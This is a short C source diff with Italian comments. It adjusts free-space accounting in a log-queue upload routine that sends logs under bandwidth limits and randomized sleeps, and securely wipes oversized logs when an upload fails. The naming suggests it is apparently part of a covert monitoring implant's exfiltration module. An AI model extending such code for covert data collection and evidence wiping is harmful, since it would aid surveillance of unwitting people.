@@ -1231,8 +1231,12 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 		// Invia il log 
 		if (!ASP_SendLog(log_file_path, band_limit)) {
-			if (GetLogSize(log_file_path) > LOG_SIZE_MAX)
-				HM_WipeFileA(log_file_path); 
+			if (GetLogSize(log_file_path) > LOG_SIZE_MAX) {
+				HM_WipeFileA(log_file_path);
+				tmp_free_space = log_free_space + log_list->size;
+				if (tmp_free_space > log_free_space) 
+					log_free_space = tmp_free_space;
+			}
 			FreeLogList(&log_list_head);
 			ASP_Bye(); // Se fallisce con PROTO_NO chiude correttamente la sessione
 			return FALSE;
